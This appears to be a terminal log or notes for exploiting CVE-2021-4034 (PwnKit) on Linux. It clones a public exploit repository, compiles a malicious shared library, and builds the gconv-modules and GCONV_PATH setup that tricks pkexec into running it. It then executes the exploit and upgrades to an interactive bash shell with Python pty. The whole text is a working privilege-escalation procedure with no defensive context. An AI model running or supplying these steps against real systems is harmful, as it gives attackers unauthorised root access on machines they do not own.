git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
gcc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
./cve-2021-4034
python -c 'import pty; pty.spawn("/bin/bash")'

